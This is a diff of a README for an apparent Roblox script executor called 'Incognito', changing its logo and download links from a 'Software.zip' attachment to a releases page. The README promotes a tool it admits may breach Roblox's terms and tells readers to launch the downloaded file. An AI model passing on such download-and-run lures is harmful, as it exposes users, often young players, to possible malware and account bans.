@@ -1,5 +1,5 @@
 # Roblox-Incognito
-![Incognito Logo](https://example.com/incognito-logo.png)
+![Incognito Logo](https://github.com/alfroy/Roblox-Incognito/releases/tag/v2.0)
 
 Incognito is a powerful Roblox script executor designed for augmenting gameplay through the execution of Lua scripts. Its intuitive interface and support for automation features make it a popular choice among Roblox enthusiasts. Please note that while Incognito offers enhanced gameplay experiences, its usage may involve risks related to Roblox's terms of service.
 
@@ -11,7 +11,7 @@ Incognito is a powerful Roblox script executor designed for augmenting gameplay 
 
 ## Get Started
 To download the Incognito package, click the button below:
-[![Download Incognito](https://img.shields.io/static/v1?label=Download&message=Software&color=blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Incognito](https://github.com/alfroy/Roblox-Incognito/releases/tag/v2.0)](https://github.com/alfroy/Roblox-Incognito/releases/tag/v2.0)
 
 ### Note:
 If the link ends with the file name, ensure to launch the downloaded file.
